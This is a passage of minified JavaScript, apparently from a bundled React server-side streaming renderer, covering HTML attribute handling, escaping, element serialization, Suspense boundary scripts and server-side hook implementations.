          c < b.length && (c === 0 ? a.enqueue(l) : (l.set(b.subarray(0, c), n), a.enqueue(l), b = b.subarray(c)), l = new Uint8Array(512), n = 0), l.set(b, n), n += b.length;
        }
    }
    function t(a, b) {
      return p(a, b), !0;
    }
    function ba(a) {
      l && 0 < n && (a.enqueue(new Uint8Array(l.buffer, 0, n)), l = null, n = 0);
    }
    var ca = new TextEncoder();
    function u(a) {
      return ca.encode(a);
    }
    function w(a) {
      return ca.encode(a);
    }
    function da(a, b) {
      typeof a.error == "function" ? a.error(b) : a.close();
    }
    var x = Object.prototype.hasOwnProperty, ea = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/, fa = {}, ha = {};
    function ia(a) {
      return x.call(ha, a) ? !0 : x.call(fa, a) ? !1 : ea.test(a) ? ha[a] = !0 : (fa[a] = !0, !1);
    }
    function y(a, b, c, d, f, e, g) {
      this.acceptsBooleans = b === 2 || b === 3 || b === 4, this.attributeName = d, this.attributeNamespace = f, this.mustUseProperty = c, this.propertyName = a, this.type = b, this.sanitizeURL = e, this.removeEmptyString = g;
    }
    var z = {};
    "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(a) {
      z[a] = new y(a, 0, !1, a, null, !1, !1);
    });
    [["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function(a) {
      var b = a[0];
      z[b] = new y(b, 1, !1, a[1], null, !1, !1);
    });
    ["contentEditable", "draggable", "spellCheck", "value"].forEach(function(a) {
      z[a] = new y(a, 2, !1, a.toLowerCase(), null, !1, !1);
    });
    ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(a) {
      z[a] = new y(a, 2, !1, a, null, !1, !1);
    });
    "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(a) {
      z[a] = new y(a, 3, !1, a.toLowerCase(), null, !1, !1);
    });
    ["checked", "multiple", "muted", "selected"].forEach(function(a) {
      z[a] = new y(a, 3, !0, a, null, !1, !1);
    });
    ["capture", "download"].forEach(function(a) {
      z[a] = new y(a, 4, !1, a, null, !1, !1);
    });
    ["cols", "rows", "size", "span"].forEach(function(a) {
      z[a] = new y(a, 6, !1, a, null, !1, !1);
    });
    ["rowSpan", "start"].forEach(function(a) {
      z[a] = new y(a, 5, !1, a.toLowerCase(), null, !1, !1);
    });
    var ja = /[\-:]([a-z])/g;
    function ka(a) {
      return a[1].toUpperCase();
    }
    "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(a) {
      var b = a.replace(
        ja,
        ka
      );
      z[b] = new y(b, 1, !1, a, null, !1, !1);
    });
    "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(a) {
      var b = a.replace(ja, ka);
      z[b] = new y(b, 1, !1, a, "http://www.w3.org/1999/xlink", !1, !1);
    });
    ["xml:base", "xml:lang", "xml:space"].forEach(function(a) {
      var b = a.replace(ja, ka);
      z[b] = new y(b, 1, !1, a, "http://www.w3.org/XML/1998/namespace", !1, !1);
    });
    ["tabIndex", "crossOrigin"].forEach(function(a) {
      z[a] = new y(a, 1, !1, a.toLowerCase(), null, !1, !1);
    });
    z.xlinkHref = new y("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
    ["src", "href", "action", "formAction"].forEach(function(a) {
      z[a] = new y(a, 1, !1, a.toLowerCase(), null, !0, !0);
    });
    var B = {
      animationIterationCount: !0,
      aspectRatio: !0,
      borderImageOutset: !0,
      borderImageSlice: !0,
      borderImageWidth: !0,
      boxFlex: !0,
      boxFlexGroup: !0,
      boxOrdinalGroup: !0,
      columnCount: !0,
      columns: !0,
      flex: !0,
      flexGrow: !0,
      flexPositive: !0,
      flexShrink: !0,
      flexNegative: !0,
      flexOrder: !0,
      gridArea: !0,
      gridRow: !0,
      gridRowEnd: !0,
      gridRowSpan: !0,
      gridRowStart: !0,
      gridColumn: !0,
      gridColumnEnd: !0,
      gridColumnSpan: !0,
      gridColumnStart: !0,
      fontWeight: !0,
      lineClamp: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      tabSize: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0,
      fillOpacity: !0,
      floodOpacity: !0,
      stopOpacity: !0,
      strokeDasharray: !0,
      strokeDashoffset: !0,
      strokeMiterlimit: !0,
      strokeOpacity: !0,
      strokeWidth: !0
    }, la = ["Webkit", "ms", "Moz", "O"];
    Object.keys(B).forEach(function(a) {
      la.forEach(function(b) {
        b = b + a.charAt(0).toUpperCase() + a.substring(1), B[b] = B[a];
      });
    });
    var oa = /["'&<>]/;
    function C(a) {
      if (typeof a == "boolean" || typeof a == "number")
        return "" + a;
      a = "" + a;
      var b = oa.exec(a);
      if (b) {
        var c = "", d, f = 0;
        for (d = b.index; d < a.length; d++) {
          switch (a.charCodeAt(d)) {
            case 34:
              b = "&quot;";
              break;
            case 38:
              b = "&amp;";
              break;
            case 39:
              b = "&#x27;";
              break;
            case 60:
              b = "&lt;";
              break;
            case 62:
              b = "&gt;";
              break;
            default:
              continue;
          }
          f !== d && (c += a.substring(f, d)), f = d + 1, c += b;
        }
        a = f !== d ? c + a.substring(f, d) : c;
      }
      return a;
    }
    var pa = /([A-Z])/g, qa = /^ms-/, ra = Array.isArray, sa = w("<script>"), ta = w("</script>"), ua = w('<script src="'), va = w('<script type="module" src="'), wa = w('" async=""></script>'), xa = /(<\/|<)(s)(cript)/gi;
    function ya(a, b, c, d) {
      return "" + b + (c === "s" ? "\\u0073" : "\\u0053") + d;
    }
    function za(a, b, c, d, f) {
      a = a === void 0 ? "" : a, b = b === void 0 ? sa : w('<script nonce="' + C(b) + '">');
      var e = [];
      if (c !== void 0 && e.push(b, u(("" + c).replace(xa, ya)), ta), d !== void 0)
        for (c = 0; c < d.length; c++)
          e.push(ua, u(C(d[c])), wa);
      if (f !== void 0)
        for (d = 0; d < f.length; d++)
          e.push(va, u(C(f[d])), wa);
      return { bootstrapChunks: e, startInlineScript: b, placeholderPrefix: w(a + "P:"), segmentPrefix: w(a + "S:"), boundaryPrefix: a + "B:", idPrefix: a, nextSuspenseID: 0, sentCompleteSegmentFunction: !1, sentCompleteBoundaryFunction: !1, sentClientRenderFunction: !1 };
    }
    function D(a, b) {
      return { insertionMode: a, selectedValue: b };
    }
    function Aa(a) {
      return D(a === "http://www.w3.org/2000/svg" ? 2 : a === "http://www.w3.org/1998/Math/MathML" ? 3 : 0, null);
    }
    function Ba(a, b, c) {
      switch (b) {
        case "select":
          return D(1, c.value != null ? c.value : c.defaultValue);
        case "svg":
          return D(2, null);
        case "math":
          return D(3, null);
        case "foreignObject":
          return D(1, null);
        case "table":
          return D(4, null);
        case "thead":
        case "tbody":
        case "tfoot":
          return D(5, null);
        case "colgroup":
          return D(7, null);
        case "tr":
          return D(6, null);
      }
      return 4 <= a.insertionMode || a.insertionMode === 0 ? D(1, null) : a;
    }
    var Ca = w("<!-- -->");
    function Da(a, b, c, d) {
      return b === "" ? d : (d && a.push(Ca), a.push(u(C(b))), !0);
    }
    var Ea = /* @__PURE__ */ new Map(), Fa = w(' style="'), Ga = w(":"), Ha = w(";");
    function Ia(a, b, c) {
      if (typeof c != "object")
        throw Error(k(62));
      b = !0;
      for (var d in c)
        if (x.call(c, d)) {
          var f = c[d];
          if (f != null && typeof f != "boolean" && f !== "") {
            if (d.indexOf("--") === 0) {
              var e = u(C(d));
              f = u(C(("" + f).trim()));
            } else {
              e = d;
              var g = Ea.get(e);
              g !== void 0 || (g = w(C(e.replace(pa, "-$1").toLowerCase().replace(qa, "-ms-"))), Ea.set(e, g)), e = g, f = typeof f == "number" ? f === 0 || x.call(B, d) ? u("" + f) : u(f + "px") : u(C(("" + f).trim()));
            }
            b ? (b = !1, a.push(Fa, e, Ga, f)) : a.push(Ha, e, Ga, f);
          }
        }
      b || a.push(E);
    }
    var H = w(" "), I = w('="'), E = w('"'), Ja = w('=""');
    function J(a, b, c, d) {
      switch (c) {
        case "style":
          Ia(a, b, d);
          return;
        case "defaultValue":
        case "defaultChecked":
        case "innerHTML":
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
          return;
      }
      if (!(2 < c.length) || c[0] !== "o" && c[0] !== "O" || c[1] !== "n" && c[1] !== "N") {
        if (b = z.hasOwnProperty(c) ? z[c] : null, b !== null) {
          switch (typeof d) {
            case "function":
            case "symbol":
              return;
            case "boolean":
              if (!b.acceptsBooleans)
                return;
          }
          switch (c = u(b.attributeName), b.type) {
            case 3:
              d && a.push(H, c, Ja);
              break;
            case 4:
              d === !0 ? a.push(H, c, Ja) : d !== !1 && a.push(H, c, I, u(C(d)), E);
              break;
            case 5:
              isNaN(d) || a.push(H, c, I, u(C(d)), E);
              break;
            case 6:
              !isNaN(d) && 1 <= d && a.push(H, c, I, u(C(d)), E);
              break;
            default:
              b.sanitizeURL && (d = "" + d), a.push(H, c, I, u(C(d)), E);
          }
        } else if (ia(c)) {
          switch (typeof d) {
            case "function":
            case "symbol":
              return;
            case "boolean":
              if (b = c.toLowerCase().slice(0, 5), b !== "data-" && b !== "aria-")
                return;
          }
          a.push(H, u(c), I, u(C(d)), E);
        }
      }
    }
    var K = w(">"), Ka = w("/>");
    function L(a, b, c) {
      if (b != null) {
        if (c != null)
          throw Error(k(60));
        if (typeof b != "object" || !("__html" in b))
          throw Error(k(61));
        b = b.__html, b != null && a.push(u("" + b));
      }
    }
    function La(a) {
      var b = "";
      return aa.Children.forEach(a, function(a2) {
        a2 != null && (b += a2);
      }), b;
    }
    var Ma = w(' selected=""');
    function Na(a, b, c, d) {
      a.push(M(c));
      var f = c = null, e;
      for (e in b)
        if (x.call(b, e)) {
          var g = b[e];
          if (g != null)
            switch (e) {
              case "children":
                c = g;
                break;
              case "dangerouslySetInnerHTML":
                f = g;
                break;
              default:
                J(a, d, e, g);
            }
        }
      return a.push(K), L(a, f, c), typeof c == "string" ? (a.push(u(C(c))), null) : c;
    }
    var Oa = w(`
`), Pa = /^[a-zA-Z][a-zA-Z:_\.\-\d]*$/, Qa = /* @__PURE__ */ new Map();
    function M(a) {
      var b = Qa.get(a);
      if (b === void 0) {
        if (!Pa.test(a))
          throw Error(k(65, a));
        b = w("<" + a), Qa.set(a, b);
      }
      return b;
    }
    var Ra = w("<!DOCTYPE html>");
    function Sa(a, b, c, d, f) {
      switch (b) {
        case "select":
          a.push(M("select"));
          var e = null, g = null;
          for (r in c)
            if (x.call(c, r)) {
              var h = c[r];
              if (h != null)
                switch (r) {
                  case "children":
                    e = h;
                    break;
                  case "dangerouslySetInnerHTML":
                    g = h;
                    break;
                  case "defaultValue":
                  case "value":
                    break;
                  default:
                    J(a, d, r, h);
                }
            }
          return a.push(K), L(a, g, e), e;
        case "option":
          g = f.selectedValue, a.push(M("option"));
          var m = h = null, q = null, r = null;
          for (e in c)
            if (x.call(c, e)) {
              var v = c[e];
              if (v != null)
                switch (e) {
                  case "children":
                    h = v;
                    break;
                  case "selected":
                    q = v;
                    break;
                  case "dangerouslySetInnerHTML":
                    r = v;
                    break;
                  case "value":
                    m = v;
                  default:
                    J(a, d, e, v);
                }
            }
          if (g != null)
            if (c = m !== null ? "" + m : La(h), ra(g)) {
              for (d = 0; d < g.length; d++)
                if ("" + g[d] === c) {
                  a.push(Ma);
                  break;
                }
            } else
              "" + g === c && a.push(Ma);
          else
            q && a.push(Ma);
          return a.push(K), L(a, r, h), h;
        case "textarea":
          a.push(M("textarea")), r = g = e = null;
          for (h in c)
            if (x.call(c, h) && (m = c[h], m != null))
              switch (h) {
                case "children":
                  r = m;
                  break;
                case "value":
                  e = m;
                  break;
                case "defaultValue":
                  g = m;
                  break;
                case "dangerouslySetInnerHTML":
                  throw Error(k(91));
                default:
                  J(a, d, h, m);
              }
          if (e === null && g !== null && (e = g), a.push(K), r != null) {
            if (e != null)
              throw Error(k(92));
            if (ra(r) && 1 < r.length)
              throw Error(k(93));
            e = "" + r;
          }
          return typeof e == "string" && e[0] === `
` && a.push(Oa), e !== null && a.push(u(C("" + e))), null;
        case "input":
          a.push(M("input")), m = r = h = e = null;
          for (g in c)
            if (x.call(c, g) && (q = c[g], q != null))
              switch (g) {
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(k(399, "input"));
                case "defaultChecked":
                  m = q;
                  break;
                case "defaultValue":
                  h = q;
                  break;
                case "checked":
                  r = q;
                  break;
                case "value":
                  e = q;
                  break;
                default:
                  J(a, d, g, q);
              }
          return r !== null ? J(
            a,
            d,
            "checked",
            r
          ) : m !== null && J(a, d, "checked", m), e !== null ? J(a, d, "value", e) : h !== null && J(a, d, "value", h), a.push(Ka), null;
        case "menuitem":
          a.push(M("menuitem"));
          for (var A in c)
            if (x.call(c, A) && (e = c[A], e != null))
              switch (A) {
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(k(400));
                default:
                  J(a, d, A, e);
              }
          return a.push(K), null;
        case "title":
          a.push(M("title")), e = null;
          for (v in c)
            if (x.call(c, v) && (g = c[v], g != null))
              switch (v) {
                case "children":
                  e = g;
                  break;
                case "dangerouslySetInnerHTML":
                  throw Error(k(434));
                default:
                  J(a, d, v, g);
              }
          return a.push(K), e;
        case "listing":
        case "pre":
          a.push(M(b)), g = e = null;
          for (m in c)
            if (x.call(c, m) && (h = c[m], h != null))
              switch (m) {
                case "children":
                  e = h;
                  break;
                case "dangerouslySetInnerHTML":
                  g = h;
                  break;
                default:
                  J(a, d, m, h);
              }
          if (a.push(K), g != null) {
            if (e != null)
              throw Error(k(60));
            if (typeof g != "object" || !("__html" in g))
              throw Error(k(61));
            c = g.__html, c != null && (typeof c == "string" && 0 < c.length && c[0] === `
` ? a.push(Oa, u(c)) : a.push(u("" + c)));
          }
          return typeof e == "string" && e[0] === `
` && a.push(Oa), e;
        case "area":
        case "base":
        case "br":
        case "col":
        case "embed":
        case "hr":
        case "img":
        case "keygen":
        case "link":
        case "meta":
        case "param":
        case "source":
        case "track":
        case "wbr":
          a.push(M(b));
          for (var F in c)
            if (x.call(c, F) && (e = c[F], e != null))
              switch (F) {
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(k(399, b));
                default:
                  J(a, d, F, e);
              }
          return a.push(Ka), null;
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
          return Na(a, c, b, d);
        case "html":
          return f.insertionMode === 0 && a.push(Ra), Na(a, c, b, d);
        default:
          if (b.indexOf("-") === -1 && typeof c.is != "string")
            return Na(a, c, b, d);
          a.push(M(b)), g = e = null;
          for (q in c)
            if (x.call(c, q) && (h = c[q], h != null))
              switch (q) {
                case "children":
                  e = h;
                  break;
                case "dangerouslySetInnerHTML":
                  g = h;
                  break;
                case "style":
                  Ia(a, d, h);
                  break;
                case "suppressContentEditableWarning":
                case "suppressHydrationWarning":
                  break;
                default:
                  ia(q) && typeof h != "function" && typeof h != "symbol" && a.push(H, u(q), I, u(C(h)), E);
              }
          return a.push(K), L(a, g, e), e;
      }
    }
    var Ta = w("</"), Ua = w(">"), Va = w('<template id="'), Wa = w('"></template>'), Xa = w("<!--$-->"), Ya = w('<!--$?--><template id="'), Za = w('"></template>'), $a = w("<!--$!-->"), ab = w("<!--/$-->"), bb = w("<template"), cb = w('"'), db = w(' data-dgst="');
    w(' data-msg="');
    w(' data-stck="');
    var eb = w("></template>");
    function fb(a, b, c) {
      if (p(a, Ya), c === null)
        throw Error(k(395));
      return p(a, c), t(a, Za);
    }
    var gb = w('<div hidden id="'), hb = w('">'), ib = w("</div>"), jb = w('<svg aria-hidden="true" style="display:none" id="'), kb = w('">'), lb = w("</svg>"), mb = w('<math aria-hidden="true" style="display:none" id="'), nb = w('">'), ob = w("</math>"), pb = w('<table hidden id="'), qb = w('">'), rb = w("</table>"), sb = w('<table hidden><tbody id="'), tb = w('">'), ub = w("</tbody></table>"), vb = w('<table hidden><tr id="'), wb = w('">'), xb = w("</tr></table>"), yb = w('<table hidden><colgroup id="'), zb = w('">'), Ab = w("</colgroup></table>");
    function Bb(a, b, c, d) {
      switch (c.insertionMode) {
        case 0:
        case 1:
          return p(a, gb), p(a, b.segmentPrefix), p(a, u(d.toString(16))), t(a, hb);
        case 2:
          return p(a, jb), p(a, b.segmentPrefix), p(a, u(d.toString(16))), t(a, kb);
        case 3:
          return p(a, mb), p(a, b.segmentPrefix), p(a, u(d.toString(16))), t(a, nb);
        case 4:
          return p(a, pb), p(a, b.segmentPrefix), p(a, u(d.toString(16))), t(a, qb);
        case 5:
          return p(a, sb), p(a, b.segmentPrefix), p(a, u(d.toString(16))), t(a, tb);
        case 6:
          return p(a, vb), p(a, b.segmentPrefix), p(a, u(d.toString(16))), t(a, wb);
        case 7:
          return p(
            a,
            yb
          ), p(a, b.segmentPrefix), p(a, u(d.toString(16))), t(a, zb);
        default:
          throw Error(k(397));
      }
    }
    function Cb(a, b) {
      switch (b.insertionMode) {
        case 0:
        case 1:
          return t(a, ib);
        case 2:
          return t(a, lb);
        case 3:
          return t(a, ob);
        case 4:
          return t(a, rb);
        case 5:
          return t(a, ub);
        case 6:
          return t(a, xb);
        case 7:
          return t(a, Ab);
        default:
          throw Error(k(397));
      }
    }
    var Db = w('function $RS(a,b){a=document.getElementById(a);b=document.getElementById(b);for(a.parentNode.removeChild(a);a.firstChild;)b.parentNode.insertBefore(a.firstChild,b);b.parentNode.removeChild(b)};$RS("'), Eb = w('$RS("'), Gb = w('","'), Hb = w('")</script>'), Ib = w('function $RC(a,b){a=document.getElementById(a);b=document.getElementById(b);b.parentNode.removeChild(b);if(a){a=a.previousSibling;var f=a.parentNode,c=a.nextSibling,e=0;do{if(c&&8===c.nodeType){var d=c.data;if("/$"===d)if(0===e)break;else e--;else"$"!==d&&"$?"!==d&&"$!"!==d||e++}d=c.nextSibling;f.removeChild(c);c=d}while(c);for(;b.firstChild;)f.insertBefore(b.firstChild,c);a.data="$";a._reactRetry&&a._reactRetry()}};$RC("'), Jb = w('$RC("'), Kb = w('","'), Lb = w('")</script>'), Mb = w('function $RX(b,c,d,e){var a=document.getElementById(b);a&&(b=a.previousSibling,b.data="$!",a=a.dataset,c&&(a.dgst=c),d&&(a.msg=d),e&&(a.stck=e),b._reactRetry&&b._reactRetry())};$RX("'), Nb = w('$RX("'), Ob = w('"'), Pb = w(")</script>"), Qb = w(","), Rb = /[<\u2028\u2029]/g;
    function Sb(a) {
      return JSON.stringify(a).replace(Rb, function(a2) {
        switch (a2) {
          case "<":
            return "\\u003c";
          case "\u2028":
            return "\\u2028";
          case "\u2029":
            return "\\u2029";
          default:
            throw Error("escapeJSStringsForInstructionScripts encountered a match it does not know how to replace. this means the match regex and the replacement characters are no longer in sync. This is a bug in React");
        }
      });
    }
    var N = Object.assign, Tb = Symbol.for("react.element"), Ub = Symbol.for("react.portal"), Vb = Symbol.for("react.fragment"), Wb = Symbol.for("react.strict_mode"), Xb = Symbol.for("react.profiler"), Yb = Symbol.for("react.provider"), Zb = Symbol.for("react.context"), $b = Symbol.for("react.forward_ref"), ac = Symbol.for("react.suspense"), bc = Symbol.for("react.suspense_list"), cc = Symbol.for("react.memo"), dc = Symbol.for("react.lazy"), ec = Symbol.for("react.scope"), fc = Symbol.for("react.debug_trace_mode"), gc = Symbol.for("react.legacy_hidden"), hc = Symbol.for("react.default_value"), ic = Symbol.iterator;
    function jc(a) {
      if (a == null)
        return null;
      if (typeof a == "function")
        return a.displayName || a.name || null;
      if (typeof a == "string")
        return a;
      switch (a) {
        case Vb:
          return "Fragment";
        case Ub:
          return "Portal";
        case Xb:
          return "Profiler";
        case Wb:
          return "StrictMode";
        case ac:
          return "Suspense";
        case bc:
          return "SuspenseList";
      }
      if (typeof a == "object")
        switch (a.$$typeof) {
          case Zb:
            return (a.displayName || "Context") + ".Consumer";
          case Yb:
            return (a._context.displayName || "Context") + ".Provider";
          case $b:
            var b = a.render;
            return a = a.displayName, a || (a = b.displayName || b.name || "", a = a !== "" ? "ForwardRef(" + a + ")" : "ForwardRef"), a;
          case cc:
            return b = a.displayName || null, b !== null ? b : jc(a.type) || "Memo";
          case dc:
            b = a._payload, a = a._init;
            try {
              return jc(a(b));
            } catch {
            }
        }
      return null;
    }
    var kc = {};
    function lc(a, b) {
      if (a = a.contextTypes, !a)
        return kc;
      var c = {}, d;
      for (d in a)
        c[d] = b[d];
      return c;
    }
    var O = null;
    function P(a, b) {
      if (a !== b) {
        a.context._currentValue = a.parentValue, a = a.parent;
        var c = b.parent;
        if (a === null) {
          if (c !== null)
            throw Error(k(401));
        } else {
          if (c === null)
            throw Error(k(401));
          P(a, c);
        }
        b.context._currentValue = b.value;
      }
    }
    function mc(a) {
      a.context._currentValue = a.parentValue, a = a.parent, a !== null && mc(a);
    }
    function nc(a) {
      var b = a.parent;
      b !== null && nc(b), a.context._currentValue = a.value;
    }
    function oc(a, b) {
      if (a.context._currentValue = a.parentValue, a = a.parent, a === null)
        throw Error(k(402));
      a.depth === b.depth ? P(a, b) : oc(a, b);
    }
    function pc(a, b) {
      var c = b.parent;
      if (c === null)
        throw Error(k(402));
      a.depth === c.depth ? P(a, c) : pc(a, c), b.context._currentValue = b.value;
    }
    function Q(a) {
      var b = O;
      b !== a && (b === null ? nc(a) : a === null ? mc(b) : b.depth === a.depth ? P(b, a) : b.depth > a.depth ? oc(b, a) : pc(b, a), O = a);
    }
    var qc = { isMounted: function() {
      return !1;
    }, enqueueSetState: function(a, b) {
      a = a._reactInternals, a.queue !== null && a.queue.push(b);
    }, enqueueReplaceState: function(a, b) {
      a = a._reactInternals, a.replace = !0, a.queue = [b];
    }, enqueueForceUpdate: function() {
    } };
    function rc(a, b, c, d) {
      var f = a.state !== void 0 ? a.state : null;
      a.updater = qc, a.props = c, a.state = f;
      var e = { queue: [], replace: !1 };
      a._reactInternals = e;
      var g = b.contextType;
      if (a.context = typeof g == "object" && g !== null ? g._currentValue : d, g = b.getDerivedStateFromProps, typeof g == "function" && (g = g(c, f), f = g == null ? f : N({}, f, g), a.state = f), typeof b.getDerivedStateFromProps != "function" && typeof a.getSnapshotBeforeUpdate != "function" && (typeof a.UNSAFE_componentWillMount == "function" || typeof a.componentWillMount == "function"))
        if (b = a.state, typeof a.componentWillMount == "function" && a.componentWillMount(), typeof a.UNSAFE_componentWillMount == "function" && a.UNSAFE_componentWillMount(), b !== a.state && qc.enqueueReplaceState(a, a.state, null), e.queue !== null && 0 < e.queue.length)
          if (b = e.queue, g = e.replace, e.queue = null, e.replace = !1, g && b.length === 1)
            a.state = b[0];
          else {
            for (e = g ? b[0] : a.state, f = !0, g = g ? 1 : 0; g < b.length; g++) {
              var h = b[g];
              h = typeof h == "function" ? h.call(a, e, c, d) : h, h != null && (f ? (f = !1, e = N({}, e, h)) : N(e, h));
            }
            a.state = e;
          }
        else
          e.queue = null;
    }
    var sc = { id: 1, overflow: "" };
    function tc(a, b, c) {
      var d = a.id;
      a = a.overflow;
      var f = 32 - uc(d) - 1;
      d &= ~(1 << f), c += 1;
      var e = 32 - uc(b) + f;
      if (30 < e) {
        var g = f - f % 5;
        return e = (d & (1 << g) - 1).toString(32), d >>= g, f -= g, { id: 1 << 32 - uc(b) + f | c << f | d, overflow: e + a };
      }
      return { id: 1 << e | c << f | d, overflow: a };
    }
    var uc = Math.clz32 ? Math.clz32 : vc, wc = Math.log, xc = Math.LN2;
    function vc(a) {
      return a >>>= 0, a === 0 ? 32 : 31 - (wc(a) / xc | 0) | 0;
    }
    function yc(a, b) {
      return a === b && (a !== 0 || 1 / a === 1 / b) || a !== a && b !== b;
    }
    var zc = typeof Object.is == "function" ? Object.is : yc, R = null, Ac = null, Bc = null, S = null, T = !1, Cc = !1, U = 0, V = null, Dc = 0;
    function W() {
      if (R === null)
        throw Error(k(321));
      return R;
    }
    function Ec() {
      if (0 < Dc)
        throw Error(k(312));
      return { memoizedState: null, queue: null, next: null };
    }
    function Fc() {
      return S === null ? Bc === null ? (T = !1, Bc = S = Ec()) : (T = !0, S = Bc) : S.next === null ? (T = !1, S = S.next = Ec()) : (T = !0, S = S.next), S;
    }
    function Gc() {
      Ac = R = null, Cc = !1, Bc = null, Dc = 0, S = V = null;
    }
    function Hc(a, b) {
      return typeof b == "function" ? b(a) : b;
    }
    function Ic(a, b, c) {
      if (R = W(), S = Fc(), T) {
        var d = S.queue;
        if (b = d.dispatch, V !== null && (c = V.get(d), c !== void 0)) {
          V.delete(d), d = S.memoizedState;
          do
            d = a(d, c.action), c = c.next;
          while (c !== null);
          return S.memoizedState = d, [d, b];
        }
        return [S.memoizedState, b];
      }
      return a = a === Hc ? typeof b == "function" ? b() : b : c !== void 0 ? c(b) : b, S.memoizedState = a, a = S.queue = { last: null, dispatch: null }, a = a.dispatch = Jc.bind(null, R, a), [S.memoizedState, a];
    }
    function Kc(a, b) {
      if (R = W(), S = Fc(), b = b === void 0 ? null : b, S !== null) {
        var c = S.memoizedState;
        if (c !== null && b !== null) {
          var d = c[1];
          a:
            if (d === null)
              d = !1;
            else {
              for (var f = 0; f < d.length && f < b.length; f++)
                if (!zc(b[f], d[f])) {
                  d = !1;
                  break a;
                }
              d = !0;
            }
          if (d)
            return c[0];
        }
      }
      return a = a(), S.memoizedState = [a, b], a;
    }
    function Jc(a, b, c) {
      if (25 <= Dc)
        throw Error(k(301));
      if (a === R)
        if (Cc = !0, a = { action: c, next: null }, V === null && (V = /* @__PURE__ */ new Map()), c = V.get(b), c === void 0)
          V.set(b, a);
        else {
          for (b = c; b.next !== null; )
            b = b.next;
          b.next = a;
        }
    }
    function Lc() {
      throw Error(k(394));
    }
    function Mc() {
    }
    var Oc = { readContext: function(a) {
      return a._currentValue;
    }, useContext: function(a) {
      return W(), a._currentValue;
    }, useMemo: Kc, useReducer: Ic, useRef: function(a) {
      R = W(), S = Fc();
      var b = S.memoizedState;
      return b === null ? (a = { current: a }, S.memoizedState = a) : b;
    }, useState: function(a) {
      return Ic(Hc, a);
    }, useInsertionEffect: Mc, useLayoutEffect: function() {
    }, useCallback: function(a, b) {
      return Kc(function() {
        return a;
      }, b);
    }, useImperativeHandle: Mc, useEffect: Mc, useDebugValue: Mc, useDeferredValue: function(a) {
      return W(), a;
    }, useTransition: function() {
      return W(), [!1, Lc];
    }, useId: function() {
      var a = Ac.treeContext, b = a.overflow;
      a = a.id, a = (a & ~(1 << 32 - uc(a) - 1)).toString(32) + b;
      var c = Nc;
      if (c === null)
        throw Error(k(404));
      return b = U++, a = ":" + c.idPrefix + "R" + a, 0 < b && (a += "H" + b.toString(32)), a + ":";
    }, useMutableSource: function(a, b) {
      return W(), b(a._source);
    }, useSyncExternalStore: function(a, b, c) {
      if (c === void 0)
        throw Error(k(407));
      return c();
    } }, Nc = null, Pc = aa.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentDispatcher;
    function Qc(a) {
      return console.error(a), null;
    }
    function X() {
    }
    function Rc(a, b, c, d, f, e, g, h, m) {
      var q = [], r = /* @__PURE__ */ new Set();
      return b = { destination: null, responseState: b, progressiveChunkSize: d === void 0 ? 12800 : d, status: 0, fatalError: null, nextSegmentId: 0, allPendingTasks: 0, pendingRootTasks: 0, completedRootSegment: null, abortableTasks: r, pingedTasks: q, clientRenderedBoundaries: [], completedBoundaries: [], partialBoundaries: [], onError: f === void 0 ? Qc : f, onAllReady: e === void 0 ? X : e, onShellReady: g === void 0 ? X : g, onShellError: h === void 0 ? X : h, onFatalError: m === void 0 ? X : m }, c = Sc(b, 0, null, c, !1, !1), c.parentFlushed = !0, a = Tc(b, a, null, c, r, kc, null, sc), q.push(a), b;
    }
    function Tc(a, b, c, d, f, e, g, h) {
      a.allPendingTasks++, c === null ? a.pendingRootTasks++ : c.pendingTasks++;
      var m = { node: b, ping: function() {
        var b2 = a.pingedTasks;
        b2.push(m), b2.length === 1 && Uc(a);
      }, blockedBoundary: c, blockedSegment: d, abortSet: f, legacyContext: e, context: g, treeContext: h };
      return f.add(m), m;
    }
    function Sc(a, b, c, d, f, e) {
      return { status: 0, id: -1, index: b, parentFlushed: !1, chunks: [], children: [], formatContext: d, boundary: c, lastPushedText: f, textEmbedded: e };
    }
